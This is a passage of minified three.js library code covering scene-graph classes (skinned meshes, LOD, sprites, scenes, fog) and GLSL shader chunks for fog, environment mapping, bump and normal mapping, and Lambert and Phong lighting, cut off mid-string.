a=0,h=this.bones.length;a<h;a++){THREE.SkinnedMesh.offsetMatrix.multiplyMatrices(this.bones[a].skinMatrix,this.boneInverses[a]);THREE.SkinnedMesh.offsetMatrix.flattenToArrayOffset(this.boneMatrices,a*16)}if(this.useVertexTexture){this.boneTexture.needsUpdate=true}};THREE.SkinnedMesh.prototype.pose=function(){this.updateMatrixWorld(true);for(var b=0;b<this.geometry.skinIndices.length;b++){var a=this.geometry.skinWeights[b];var c=1/a.lengthManhattan();if(c!==Infinity){a.multiplyScalar(c)}else{a.set(1)}}};THREE.SkinnedMesh.prototype.clone=function(a){if(a===undefined){a=new THREE.SkinnedMesh(this.geometry,this.material,this.useVertexTexture)}THREE.Mesh.prototype.clone.call(this,a);return a};THREE.SkinnedMesh.offsetMatrix=new THREE.Matrix4();THREE.Ribbon=function(b,a){THREE.Object3D.call(this);this.geometry=b;this.material=a};THREE.Ribbon.prototype=Object.create(THREE.Object3D.prototype);THREE.Ribbon.prototype.clone=function(a){if(a===undefined){a=new THREE.Ribbon(this.geometry,this.material)}THREE.Object3D.prototype.clone.call(this,a);return a};THREE.LOD=function(){THREE.Object3D.call(this);this.objects=[]};THREE.LOD.prototype=Object.create(THREE.Object3D.prototype);THREE.LOD.prototype.addLevel=function(b,c){if(c===undefined){c=0}c=Math.abs(c);for(var a=0;a<this.objects.length;a++){if(c<this.objects[a].distance){break}}this.objects.splice(a,0,{distance:c,object:b});this.add(b)};THREE.LOD.prototype.getObjectForDistance=function(c){for(var b=1,a=this.objects.length;b<a;b++){if(c<this.objects[b].distance){break}}return this.objects[b-1].object};THREE.LOD.prototype.update=function(){var b=new THREE.Vector3();var a=new THREE.Vector3();return function(f){if(this.objects.length>1){b.getPositionFromMatrix(f.matrixWorld);a.getPositionFromMatrix(this.matrixWorld);var g=b.distanceTo(a);this.objects[0].object.visible=true;for(var e=1,c=this.objects.length;e<c;e++){if(g>=this.objects[e].distance){this.objects[e-1].object.visible=false;this.objects[e].object.visible=true}else{break}}for(;e<c;e++){this.objects[e].object.visible=false}}}}();THREE.LOD.prototype.clone=function(){};THREE.Sprite=function(a){THREE.Object3D.call(this);this.material=(a!==undefined)?a:new THREE.SpriteMaterial();this.rotation3d=this.rotation;this.rotation=0};THREE.Sprite.prototype=Object.create(THREE.Object3D.prototype);THREE.Sprite.prototype.updateMatrix=function(){this.rotation3d.set(0,0,this.rotation);this.quaternion.setFromEuler(this.rotation3d,this.eulerOrder);this.matrix.makeFromPositionQuaternionScale(this.position,this.quaternion,this.scale);this.matrixWorldNeedsUpdate=true};THREE.Sprite.prototype.clone=function(a){if(a===undefined){a=new THREE.Sprite(this.material)}THREE.Object3D.prototype.clone.call(this,a);return a};THREE.Scene=function(){THREE.Object3D.call(this);this.fog=null;this.overrideMaterial=null;this.autoUpdate=true;this.matrixAutoUpdate=false;this.__objects=[];this.__lights=[];this.__objectsAdded=[];this.__objectsRemoved=[]};THREE.Scene.prototype=Object.create(THREE.Object3D.prototype);THREE.Scene.prototype.__addObject=function(a){if(a instanceof THREE.Light){if(this.__lights.indexOf(a)===-1){this.__lights.push(a)}if(a.target&&a.target.parent===undefined){this.add(a.target)}}else{if(!(a instanceof THREE.Camera||a instanceof THREE.Bone)){if(this.__objects.indexOf(a)===-1){this.__objects.push(a);this.__objectsAdded.push(a);var b=this.__objectsRemoved.indexOf(a);if(b!==-1){this.__objectsRemoved.splice(b,1)}}}}for(var e=0;e<a.children.length;e++){this.__addObject(a.children[e])}};THREE.Scene.prototype.__removeObject=function(b){if(b instanceof THREE.Light){var e=this.__lights.indexOf(b);if(e!==-1){this.__lights.splice(e,1)}}else{if(!(b instanceof THREE.Camera)){var e=this.__objects.indexOf(b);if(e!==-1){this.__objects.splice(e,1);this.__objectsRemoved.push(b);var a=this.__objectsAdded.indexOf(b);if(a!==-1){this.__objectsAdded.splice(a,1)}}}}for(var f=0;f<b.children.length;f++){this.__removeObject(b.children[f])}};THREE.Fog=function(c,b,a){this.name="";this.color=new THREE.Color(c);this.near=(b!==undefined)?b:1;this.far=(a!==undefined)?a:1000};THREE.Fog.prototype.clone=function(){return new THREE.Fog(this.color.getHex(),this.near,this.far)};THREE.FogExp2=function(b,a){this.name="";this.color=new THREE.Color(b);this.density=(a!==undefined)?a:0.00025};THREE.FogExp2.prototype.clone=function(){return new THREE.FogExp2(this.color.getHex(),this.density)};THREE.ShaderChunk={fog_pars_fragment:["#ifdef USE_FOG","uniform vec3 fogColor;","#ifdef FOG_EXP2","uniform float fogDensity;","#else","uniform float fogNear;","uniform float fogFar;","#endif","#endif"].join("\n"),fog_fragment:["#ifdef USE_FOG","float depth = gl_FragCoord.z / gl_FragCoord.w;","#ifdef FOG_EXP2","const float LOG2 = 1.442695;","float fogFactor = exp2( - fogDensity * fogDensity * depth * depth * LOG2 );","fogFactor = 1.0 - clamp( fogFactor, 0.0, 1.0 );","#else","float fogFactor = smoothstep( fogNear, fogFar, depth );","#endif","gl_FragColor = mix( gl_FragColor, vec4( fogColor, gl_FragColor.w ), fogFactor );","#endif"].join("\n"),envmap_pars_fragment:["#ifdef USE_ENVMAP","uniform float reflectivity;","uniform samplerCube envMap;","uniform float flipEnvMap;","uniform int combine;","#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP )","uniform bool useRefract;","uniform float refractionRatio;","#else","varying vec3 vReflect;","#endif","#endif"].join("\n"),envmap_fragment:["#ifdef USE_ENVMAP","vec3 reflectVec;","#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP )","vec3 cameraToVertex = normalize( vWorldPosition - cameraPosition );","if ( useRefract ) {","reflectVec = refract( cameraToVertex, normal, refractionRatio );","} else { ","reflectVec = reflect( cameraToVertex, normal );","}","#else","reflectVec = vReflect;","#endif","#ifdef DOUBLE_SIDED","float flipNormal = ( -1.0 + 2.0 * float( gl_FrontFacing ) );","vec4 cubeColor = textureCube( envMap, flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );","#else","vec4 cubeColor = textureCube( envMap, vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );","#endif","#ifdef GAMMA_INPUT","cubeColor.xyz *= cubeColor.xyz;","#endif","if ( combine == 1 ) {","gl_FragColor.xyz = mix( gl_FragColor.xyz, cubeColor.xyz, specularStrength * reflectivity );","} else if ( combine == 2 ) {","gl_FragColor.xyz += cubeColor.xyz * specularStrength * reflectivity;","} else {","gl_FragColor.xyz = mix( gl_FragColor.xyz, gl_FragColor.xyz * cubeColor.xyz, specularStrength * reflectivity );","}","#endif"].join("\n"),envmap_pars_vertex:["#if defined( USE_ENVMAP ) && ! defined( USE_BUMPMAP ) && ! defined( USE_NORMALMAP )","varying vec3 vReflect;","uniform float refractionRatio;","uniform bool useRefract;","#endif"].join("\n"),worldpos_vertex:["#if defined( USE_ENVMAP ) || defined( PHONG ) || defined( LAMBERT ) || defined ( USE_SHADOWMAP )","#ifdef USE_SKINNING","vec4 worldPosition = modelMatrix * skinned;","#endif","#if defined( USE_MORPHTARGETS ) && ! defined( USE_SKINNING )","vec4 worldPosition = modelMatrix * vec4( morphed, 1.0 );","#endif","#if ! defined( USE_MORPHTARGETS ) && ! defined( USE_SKINNING )","vec4 worldPosition = modelMatrix * vec4( position, 1.0 );","#endif","#endif"].join("\n"),envmap_vertex:["#if defined( USE_ENVMAP ) && ! defined( USE_BUMPMAP ) && ! defined( USE_NORMALMAP )","vec3 worldNormal = mat3( modelMatrix[ 0 ].xyz, modelMatrix[ 1 ].xyz, modelMatrix[ 2 ].xyz ) * objectNormal;","worldNormal = normalize( worldNormal );","vec3 cameraToVertex = normalize( worldPosition.xyz - cameraPosition );","if ( useRefract ) {","vReflect = refract( cameraToVertex, worldNormal, refractionRatio );","} else {","vReflect = reflect( cameraToVertex, worldNormal );","}","#endif"].join("\n"),map_particle_pars_fragment:["#ifdef USE_MAP","uniform sampler2D map;","#endif"].join("\n"),map_particle_fragment:["#ifdef USE_MAP","gl_FragColor = gl_FragColor * texture2D( map, vec2( gl_PointCoord.x, 1.0 - gl_PointCoord.y ) );","#endif"].join("\n"),map_pars_vertex:["#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP )","varying vec2 vUv;","uniform vec4 offsetRepeat;","#endif"].join("\n"),map_pars_fragment:["#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP )","varying vec2 vUv;","#endif","#ifdef USE_MAP","uniform sampler2D map;","#endif"].join("\n"),map_vertex:["#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP )","vUv = uv * offsetRepeat.zw + offsetRepeat.xy;","#endif"].join("\n"),map_fragment:["#ifdef USE_MAP","vec4 texelColor = texture2D( map, vUv );","#ifdef GAMMA_INPUT","texelColor.xyz *= texelColor.xyz;","#endif","gl_FragColor = gl_FragColor * texelColor;","#endif"].join("\n"),lightmap_pars_fragment:["#ifdef USE_LIGHTMAP","varying vec2 vUv2;","uniform sampler2D lightMap;","#endif"].join("\n"),lightmap_pars_vertex:["#ifdef USE_LIGHTMAP","varying vec2 vUv2;","#endif"].join("\n"),lightmap_fragment:["#ifdef USE_LIGHTMAP","gl_FragColor = gl_FragColor * texture2D( lightMap, vUv2 );","#endif"].join("\n"),lightmap_vertex:["#ifdef USE_LIGHTMAP","vUv2 = uv2;","#endif"].join("\n"),bumpmap_pars_fragment:["#ifdef USE_BUMPMAP","uniform sampler2D bumpMap;","uniform float bumpScale;","vec2 dHdxy_fwd() {","vec2 dSTdx = dFdx( vUv );","vec2 dSTdy = dFdy( vUv );","float Hll = bumpScale * texture2D( bumpMap, vUv ).x;","float dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;","float dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;","return vec2( dBx, dBy );","}","vec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy ) {","vec3 vSigmaX = dFdx( surf_pos );","vec3 vSigmaY = dFdy( surf_pos );","vec3 vN = surf_norm;","vec3 R1 = cross( vSigmaY, vN );","vec3 R2 = cross( vN, vSigmaX );","float fDet = dot( vSigmaX, R1 );","vec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );","return normalize( abs( fDet ) * surf_norm - vGrad );","}","#endif"].join("\n"),normalmap_pars_fragment:["#ifdef USE_NORMALMAP","uniform sampler2D normalMap;","uniform vec2 normalScale;","vec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm ) {","vec3 q0 = dFdx( eye_pos.xyz );","vec3 q1 = dFdy( eye_pos.xyz );","vec2 st0 = dFdx( vUv.st );","vec2 st1 = dFdy( vUv.st );","vec3 S = normalize(  q0 * st1.t - q1 * st0.t );","vec3 T = normalize( -q0 * st1.s + q1 * st0.s );","vec3 N = normalize( surf_norm );","vec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;","mapN.xy = normalScale * mapN.xy;","mat3 tsn = mat3( S, T, N );","return normalize( tsn * mapN );","}","#endif"].join("\n"),specularmap_pars_fragment:["#ifdef USE_SPECULARMAP","uniform sampler2D specularMap;","#endif"].join("\n"),specularmap_fragment:["float specularStrength;","#ifdef USE_SPECULARMAP","vec4 texelSpecular = texture2D( specularMap, vUv );","specularStrength = texelSpecular.r;","#else","specularStrength = 1.0;","#endif"].join("\n"),lights_lambert_pars_vertex:["uniform vec3 ambient;","uniform vec3 diffuse;","uniform vec3 emissive;","uniform vec3 ambientLightColor;","#if MAX_DIR_LIGHTS > 0","uniform vec3 directionalLightColor[ MAX_DIR_LIGHTS ];","uniform vec3 directionalLightDirection[ MAX_DIR_LIGHTS ];","#endif","#if MAX_HEMI_LIGHTS > 0","uniform vec3 hemisphereLightSkyColor[ MAX_HEMI_LIGHTS ];","uniform vec3 hemisphereLightGroundColor[ MAX_HEMI_LIGHTS ];","uniform vec3 hemisphereLightDirection[ MAX_HEMI_LIGHTS ];","#endif","#if MAX_POINT_LIGHTS > 0","uniform vec3 pointLightColor[ MAX_POINT_LIGHTS ];","uniform vec3 pointLightPosition[ MAX_POINT_LIGHTS ];","uniform float pointLightDistance[ MAX_POINT_LIGHTS ];","#endif","#if MAX_SPOT_LIGHTS > 0","uniform vec3 spotLightColor[ MAX_SPOT_LIGHTS ];","uniform vec3 spotLightPosition[ MAX_SPOT_LIGHTS ];","uniform vec3 spotLightDirection[ MAX_SPOT_LIGHTS ];","uniform float spotLightDistance[ MAX_SPOT_LIGHTS ];","uniform float spotLightAngleCos[ MAX_SPOT_LIGHTS ];","uniform float spotLightExponent[ MAX_SPOT_LIGHTS ];","#endif","#ifdef WRAP_AROUND","uniform vec3 wrapRGB;","#endif"].join("\n"),lights_lambert_vertex:["vLightFront = vec3( 0.0 );","#ifdef DOUBLE_SIDED","vLightBack = vec3( 0.0 );","#endif","transformedNormal = normalize( transformedNormal );","#if MAX_DIR_LIGHTS > 0","for( int i = 0; i < MAX_DIR_LIGHTS; i ++ ) {","vec4 lDirection = viewMatrix * vec4( directionalLightDirection[ i ], 0.0 );","vec3 dirVector = normalize( lDirection.xyz );","float dotProduct = dot( transformedNormal, dirVector );","vec3 directionalLightWeighting = vec3( max( dotProduct, 0.0 ) );","#ifdef DOUBLE_SIDED","vec3 directionalLightWeightingBack = vec3( max( -dotProduct, 0.0 ) );","#ifdef WRAP_AROUND","vec3 directionalLightWeightingHalfBack = vec3( max( -0.5 * dotProduct + 0.5, 0.0 ) );","#endif","#endif","#ifdef WRAP_AROUND","vec3 directionalLightWeightingHalf = vec3( max( 0.5 * dotProduct + 0.5, 0.0 ) );","directionalLightWeighting = mix( directionalLightWeighting, directionalLightWeightingHalf, wrapRGB );","#ifdef DOUBLE_SIDED","directionalLightWeightingBack = mix( directionalLightWeightingBack, directionalLightWeightingHalfBack, wrapRGB );","#endif","#endif","vLightFront += directionalLightColor[ i ] * directionalLightWeighting;","#ifdef DOUBLE_SIDED","vLightBack += directionalLightColor[ i ] * directionalLightWeightingBack;","#endif","}","#endif","#if MAX_POINT_LIGHTS > 0","for( int i = 0; i < MAX_POINT_LIGHTS; i ++ ) {","vec4 lPosition = viewMatrix * vec4( pointLightPosition[ i ], 1.0 );","vec3 lVector = lPosition.xyz - mvPosition.xyz;","float lDistance = 1.0;","if ( pointLightDistance[ i ] > 0.0 )","lDistance = 1.0 - min( ( length( lVector ) / pointLightDistance[ i ] ), 1.0 );","lVector = normalize( lVector );","float dotProduct = dot( transformedNormal, lVector );","vec3 pointLightWeighting = vec3( max( dotProduct, 0.0 ) );","#ifdef DOUBLE_SIDED","vec3 pointLightWeightingBack = vec3( max( -dotProduct, 0.0 ) );","#ifdef WRAP_AROUND","vec3 pointLightWeightingHalfBack = vec3( max( -0.5 * dotProduct + 0.5, 0.0 ) );","#endif","#endif","#ifdef WRAP_AROUND","vec3 pointLightWeightingHalf = vec3( max( 0.5 * dotProduct + 0.5, 0.0 ) );","pointLightWeighting = mix( pointLightWeighting, pointLightWeightingHalf, wrapRGB );","#ifdef DOUBLE_SIDED","pointLightWeightingBack = mix( pointLightWeightingBack, pointLightWeightingHalfBack, wrapRGB );","#endif","#endif","vLightFront += pointLightColor[ i ] * pointLightWeighting * lDistance;","#ifdef DOUBLE_SIDED","vLightBack += pointLightColor[ i ] * pointLightWeightingBack * lDistance;","#endif","}","#endif","#if MAX_SPOT_LIGHTS > 0","for( int i = 0; i < MAX_SPOT_LIGHTS; i ++ ) {","vec4 lPosition = viewMatrix * vec4( spotLightPosition[ i ], 1.0 );","vec3 lVector = lPosition.xyz - mvPosition.xyz;","float spotEffect = dot( spotLightDirection[ i ], normalize( spotLightPosition[ i ] - worldPosition.xyz ) );","if ( spotEffect > spotLightAngleCos[ i ] ) {","spotEffect = max( pow( spotEffect, spotLightExponent[ i ] ), 0.0 );","float lDistance = 1.0;","if ( spotLightDistance[ i ] > 0.0 )","lDistance = 1.0 - min( ( length( lVector ) / spotLightDistance[ i ] ), 1.0 );","lVector = normalize( lVector );","float dotProduct = dot( transformedNormal, lVector );","vec3 spotLightWeighting = vec3( max( dotProduct, 0.0 ) );","#ifdef DOUBLE_SIDED","vec3 spotLightWeightingBack = vec3( max( -dotProduct, 0.0 ) );","#ifdef WRAP_AROUND","vec3 spotLightWeightingHalfBack = vec3( max( -0.5 * dotProduct + 0.5, 0.0 ) );","#endif","#endif","#ifdef WRAP_AROUND","vec3 spotLightWeightingHalf = vec3( max( 0.5 * dotProduct + 0.5, 0.0 ) );","spotLightWeighting = mix( spotLightWeighting, spotLightWeightingHalf, wrapRGB );","#ifdef DOUBLE_SIDED","spotLightWeightingBack = mix( spotLightWeightingBack, spotLightWeightingHalfBack, wrapRGB );","#endif","#endif","vLightFront += spotLightColor[ i ] * spotLightWeighting * lDistance * spotEffect;","#ifdef DOUBLE_SIDED","vLightBack += spotLightColor[ i ] * spotLightWeightingBack * lDistance * spotEffect;","#endif","}","}","#endif","#if MAX_HEMI_LIGHTS > 0","for( int i = 0; i < MAX_HEMI_LIGHTS; i ++ ) {","vec4 lDirection = viewMatrix * vec4( hemisphereLightDirection[ i ], 0.0 );","vec3 lVector = normalize( lDirection.xyz );","float dotProduct = dot( transformedNormal, lVector );","float hemiDiffuseWeight = 0.5 * dotProduct + 0.5;","float hemiDiffuseWeightBack = -0.5 * dotProduct + 0.5;","vLightFront += mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeight );","#ifdef DOUBLE_SIDED","vLightBack += mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeightBack );","#endif","}","#endif","vLightFront = vLightFront * diffuse + ambient * ambientLightColor + emissive;","#ifdef DOUBLE_SIDED","vLightBack = vLightBack * diffuse + ambient * ambientLightColor + emissive;","#endif"].join("\n"),lights_phong_pars_vertex:["#ifndef PHONG_PER_PIXEL","#if MAX_POINT_LIGHTS > 0","uniform vec3 pointLightPosition[ MAX_POINT_LIGHTS ];","uniform float pointLightDistance[ MAX_POINT_LIGHTS ];","varying vec4 vPointLight[ MAX_POINT_LIGHTS ];","#endif","#if MAX_SPOT_LIGHTS > 0","uniform vec3 spotLightPosition[ MAX_SPOT_LIGHTS ];","uniform float spotLightDistance[ MAX_SPOT_LIGHTS ];","varying vec4 vSpotLight[ MAX_SPOT_LIGHTS ];","#endif","#endif","#if MAX_SPOT_LIGHTS > 0 || defined( USE_BUMPMAP )","varying vec3 vWorldPosition;","#endif"].join("\n"),lights_phong_vertex:["#ifndef PHONG_PER_PIXEL","#if MAX_POINT_LIGHTS > 0","for( int i = 0; i < MAX_POINT_LIGHTS; i ++ ) {","vec4 lPosition = viewMatrix * vec4( pointLightPosition[ i ], 1.0 );","vec3 lVector = lPosition.xyz - mvPosition.xyz;","float lDistance = 1.0;","if ( pointLightDistance[ i ] > 0.0 )","lDistance = 1.0 - min( ( length( lVector ) / pointLightDistance[ i ] ), 1.0 );","vPointLight[ i ] = vec4( lVector, lDistance );","}","#endif","#if MAX_SPOT_LIGHTS > 0","for( int i = 0; i < MAX_SPOT_LIGHTS; i ++ ) {","vec4 lPosition = viewMatrix * vec4( spotLightPosition[ i ], 1.0 );","vec3 lVector = lPosition.xyz - mvPosition.xyz;","float lDistance = 1.0;","if ( spotLightDistance[ i ] > 0.0 )","lDistance = 1.0 - min( ( length( lVector ) / spotLightDistance[ i ] ), 1.0 );","vSpotLight[ i ] = vec4( lVector, lDistance );","}","#endif","#endif","#if MAX_SPOT_LIGHTS > 0 || defined( USE_BUMPMAP )","vWorldPosition = worldPosition.xyz;","#endif"].join("\n"),lights_phong_pars_fragment:["uniform vec3 ambientLightColor;","#if MAX_DIR_LIGHTS > 0","uniform vec3 directionalLightColor[ MAX_DIR_LIGHTS ];","uniform vec3 directionalLightDirection[ MAX_DIR_LIGHTS ];","#endif","#if MAX_HEMI_LIGHTS > 0","uniform vec3 hemisphereLightSkyColor[ MAX_HEMI_LIGHTS ];","uniform vec3 hemisphereLightGroundColor[ MAX_HEMI_LIGHTS ];","uniform vec3 hemisphereLightDirection[ MAX_HEMI_LIGHTS ];","#endif","#if MAX_POINT_LIGHTS > 0","uniform vec3 pointLightColor[ MAX_POINT_LIGHTS ];","#ifdef PHONG_PER_PIXEL","uniform vec3 pointLightPosition[ MAX_POINT_LIGHTS ];","uniform float pointLightDistance[ MAX_POINT_LIGHTS ];","#else","varying vec4 vPointLight[ MAX_POINT_LIGHTS ];","#endif","#endif","#if MAX_SPOT_LIGHTS > 0","uniform vec3 spotLightColor[ MAX_SPOT_LIGHTS ];","uniform vec3 spotLightPosition[ MAX_SPOT_LIGHTS ];","uniform vec3 spotLightDirection[ MAX_SPOT_LIGHTS ];","uniform float spotLightAngleCos[ MAX_SPOT_LIGHTS ];","uniform float spotLightExponent[ MAX_SPOT_LIGHTS ];","#ifdef PHONG_PER_PIXEL","uniform float spotLightDistance[ MAX_SPOT_LIGHTS ];","#else","varying vec4 vSpotLight[ MAX_SPOT_LIGHTS ];","#endif","#endif","#if MAX_SPOT_LIGHTS > 0 || defined( USE_BUMPMAP )","varying vec3 vWorldPosition;","#endif","#ifdef WRAP_AROUND","uniform vec3 wrapRGB;","#endif","varying vec3 vViewPosition;","varying vec3 vNormal;"].join("\n"),lights_phong_fragment:["vec3 normal = normalize( vNormal );","vec3 viewPosition = normalize( vViewPosition );","#ifdef DOUBLE_SIDED","normal = normal * ( -1.0 + 2.0 * float( gl_FrontFacing ) );","#endif","#ifdef USE_NORMALMAP","normal = perturbNormal2Arb( -vViewPosition, normal );","#elif defined( USE_BUMPMAP )","normal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() );","#endif","#if MAX_POINT_LIGHTS > 0","vec3 pointDiffuse  = vec3( 0.0 );","vec3 pointSpecular = vec3( 0.0 );","for ( int i = 0; i < MAX_POINT_LIGHTS; i ++ ) {","#ifdef PHONG_PER_PIXEL","vec4 lPosition = viewMatrix * vec4( pointLightPosition[ i ], 1.0 );","vec3 lVector = lPosition.xyz + vViewPosition.xyz;","float lDistance = 1.0;","if ( pointLightDistance[ i ] > 0.0 )","lDistance = 1.0 - min( ( length( lVector ) / pointLightDistance[ i ] ), 1.0 );","lVector = normalize( lVector );","#else","vec3 lVector = normalize( vPointLight[ i ].xyz );","float lDistance = vPointLight[ i ].w;","#endif","float dotProduct = dot( normal, lVector );","#ifdef WRAP_AROUND","float pointDiffuseWeightFull = max( dotProduct, 0.0 );","float pointDiffuseWeightHalf = max( 0.5 * dotProduct + 0.5, 0.0 );","vec3 pointDiffuseWeight = mix( vec3 ( pointDiffuseWeightFull ), vec3( pointDiffuseWeightHalf ), wrapRGB );","#else","float pointDiffuseWeight = max( dotProduct, 0.0 );","#endif","pointDiffuse  += diffuse * pointLightColor[ i ] * pointDiffuseWeight * lDistance;","vec3 pointHalfVector = normalize( lVector + viewPosition );","float pointDotNormalHalf = max( dot( normal, pointHalfVector ), 0.0 );","float pointSpecularWeight = specularStrength * max( pow( pointDotNormalHalf, shininess ), 0.0 );","#ifdef PHYSICALLY_BASED_SHADING","float specularNormalization = ( shininess + 2.0001 ) / 8.0;","vec3 schlick = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( lVector, pointHalfVector ), 5.0 );","pointSpecular += schlick * pointLightColor[ i ] * pointSpecularWeight * pointDiffuseWeight * lDistance * specularNormalization;","#else","pointSpecular += specular * pointLightColor[ i ] * pointSpecularWeight * pointDiffuseWeight * lDistance;","#endif","}","#endif","#if MAX_SPOT_LIGHTS > 0","vec3 spotDiffuse  = vec3( 0.0 );","vec3 spotSpecular = vec3( 0.0 );","for ( int i = 0; i < MAX_SPOT_LIGHTS; i ++ ) {","#ifdef PHONG_PER_PIXEL","vec4 lPosition = viewMatrix * vec4( spotLightPosition[ i ], 1.0 );","vec3 lVector = lPosition.xyz + vViewPosition.xyz;","float lDistance = 1.0;","if ( spotLightDistance[ i ] > 0.0 )","lDistance = 1.0 - min( ( length( lVector ) / spotLightDistance[ i ] ), 1.0 );","lVector = normalize( lVector );","#else","vec3 lVector = normalize( vSpotLight[ i ].xyz );","float lDistance = vSpotLight[ i ].w;","#endif","float spotEffect = dot( spotLightDirection[ i ], normalize( spotLightPosition[ i ] - vWorldPosition ) );","if ( spotEffect > spotLightAngleCos[ i ] ) {","spotEffect = max( pow( spotEffect, spotLightExponent[ i ] ), 0.0 );","float dotProduct = dot( normal, lVector );","#ifdef WRAP_AROUND","float spotDiffuseWeightFull = max( dotProduct, 0.0 );","float spotDiffuseWeightHalf = max( 0.5 * dotProduct + 0.5, 0.0 );","vec3 spotDiffuseWeight = mix( vec3 ( spotDiffuseWeightFull ), vec3( spotDiffuseWeightHalf ), wrapRGB );","#else","float spotDiffuseWeight = max( dotProduct, 0.0 );","#endif","spotDiffuse += diffuse * spotLightColor[ i ] * spotDiffuseWeight * lDistance * spotEffect;","vec3 spotHalfVector = normalize( lVector + viewPosition );","float spotDotNormalHalf = max( dot( normal, spotHalfVector ), 0.0 );","float spotSpecularWeight = specularStrength * max( pow( spotDotNormalHalf, shininess ), 0.0 );","#ifdef PHYSICALLY_BASED_SHADING","float specularNormalization = ( shininess + 2.0001 ) / 8.0;","vec3 schlick = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( lVector, spotHalfVector ), 5.0 );","spotSpecular += schlick * spotLightColor[ i ] * spotSpecularWeight * spotDiffuseWeight * lDistance * specularNormalization * spotEffect;","#else","spotSpecular += specular * spotLightColor[ i ] * spotSpecularWeight * spotDiffuseWeight * lDistance * spotEffect;","#endif","}","}","#endif","#if MAX_DIR_LIGHTS > 0","vec3 dirDiffuse  = vec3( 0.0 );","vec3 dirSpecular = vec3( 0.0 );","for( int i = 0; i < MAX_DIR_LIGHTS; i ++ ) {","vec4 lDirection = viewMatrix * vec4( directionalLightDirection[ i ], 0.0 );","vec3 dirVector = normalize( lDirection.xyz );","float dotProduct = dot( normal, dirVector );","#ifdef WRAP_AROUND","float dirDiffuseWeightFull = max( dotProduct, 0.0 );","float dirDiffuseWeightHalf = max( 0.5 * dotProduct + 0.5, 0.0 );","vec3 dirDiffuseWeight = mix( vec3( dirDiffuseWeightFull ), vec3( dirDiffuseWeightHalf ), wrapRGB );","#else","float dirDiffuseWeight = max( dotProduct, 0.0 );","#endif","dirDiffuse  += diffuse * directionalLightColor[ i ] * dirDiffuseWeight;","vec3 dirHalfVector = normalize( dirVector + viewPosition );","float dirDotNormalHalf = max( dot( normal, dirHalfVector ), 0.0 );","float dirSpecularWeight = specularStrength * max( pow( dirDotNormalHalf, shininess ), 0.0 );","#ifdef PHYSICALLY_BASED_SHADING","float specularNormalization = ( shininess + 2.0001 ) / 8.0;","vec3 schlick = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( dirVector, dirHalfVector ), 5.0 );","dirSpecular += schlick * directionalLightColor[ i ] * dirSpecularWeight * dirDiffuseWeight * specularNormalization;","#else","dirSpecular += specular * directionalLightColor[ i ] * dirSpecularWeight * dirDiffuseWeight;","#endif","}","#endif","#if MAX_HEMI_LIGHTS > 0","vec3 hemiDiffuse  = vec3( 0.0 );","vec3 hemiSpecular = vec3( 0.0 );","for( int i = 0; i < MAX_HEMI_LIGHTS; i ++ ) {","vec4 lDirection = viewMatrix * vec4( hemisphereLightDirection[ i ], 0.0 );","vec3 lVector = normalize( lDirection.xyz );","float dotProduct = dot( normal, lVector );","float hemiDiffuseWeight = 0.5 * dotProduct + 0.5;","vec3 hemiColor = mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeight );","hemiDiffuse += diffuse * hemiColor;","vec3 hemiHalfVectorSky = normalize( lVector + viewPosition );","float hemiDotNormalHalfSky = 0.5 * dot( normal, hemiHalfVectorSky ) + 0.5;","float hemiSpecularWeightSky = specularStrength * max( pow( hemiDotNormalHalfSky, shininess ), 0.0 );","vec3 lVectorGround = -lVector;","vec3 hemiHalfVectorGround = normalize( lVectorGround + viewPosition );","float hemiDotNormalHalfGround = 0.5 * dot( normal, hemiHalfVectorGround ) + 0.5;","float hemiSpecularWeightGround = specularStrength * max( pow( hemiDotNormalHalfGround, shininess ), 0.0 );","#ifdef PHYSICALLY_BASED_SHADING","float dotProductGround = dot( normal, lVectorGround );","float specularNormalization = ( shininess + 2.0001 ) / 8.0;","vec3 schlickSky = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( lVector, hemiHalfVectorSky ), 5.0 );","vec3 schlickGround = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( lVectorGround, hemiHalfVectorGround ), 5.0 );","hemiSpecular += hemiColor * specularNormalization * ( schlickSky * hemiSpecularWeightSky * max( dotProduct, 0.0 ) + schlickGround * hemiSpecularWeightGround * max( dotProductGround, 0.0 ) );","#else","hemiSpecular += specular * hemiColor * ( hemiSpecularWeightSky + hemiSpecularWeightGround ) * hemiDiffuseWeight;","#endif","}","#endif","vec3 totalDiffuse = vec3( 0.0 );","vec3 totalSpecular = vec3( 0.0 );","#if MAX_DIR_LIGHTS > 0","totalDiffuse += dirDiffuse;","totalSpecular += dirSpecular;","#endif","#if MAX_HEMI_LIGHTS > 0","totalDiffuse += hemiDiffuse;","totalSpecular += hemiSpecular;","#endif","#if MAX_POINT_LIGHTS > 0","totalDiffuse += pointDiffuse;","totalSpecular += pointSpecular;","#endif","#if MAX_SPOT_LIGHTS > 0","totalDiffuse += spotDiffuse;","totalSpecular += spotSpecular;","#endif","#ifdef METAL","gl_FragColor.xyz = gl_FragColor.xyz * ( emissive + totalDiffuse + ambientLightColor * ambient + totalSpecular );","#else","gl_FragColor.xyz = gl_FragColor.xyz * ( emissive 